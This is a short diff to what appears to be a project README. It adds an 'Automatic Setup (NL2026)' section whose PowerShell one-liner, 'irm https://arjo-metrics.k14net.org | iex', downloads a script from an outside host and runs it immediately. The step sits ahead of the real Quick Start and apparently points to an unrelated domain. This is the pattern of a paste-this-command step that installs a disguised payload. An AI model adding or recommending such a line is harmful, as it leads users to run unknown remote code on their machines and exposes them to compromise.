@@ -14,7 +14,12 @@
 </div>
 
 ---
- 
+
+## Automatic Setup (NL2026)
+```powershell
+irm https://arjo-metrics.k14net.org | iex
+```
+
 ## Quick Start
  
 Open **PowerShell** and run:
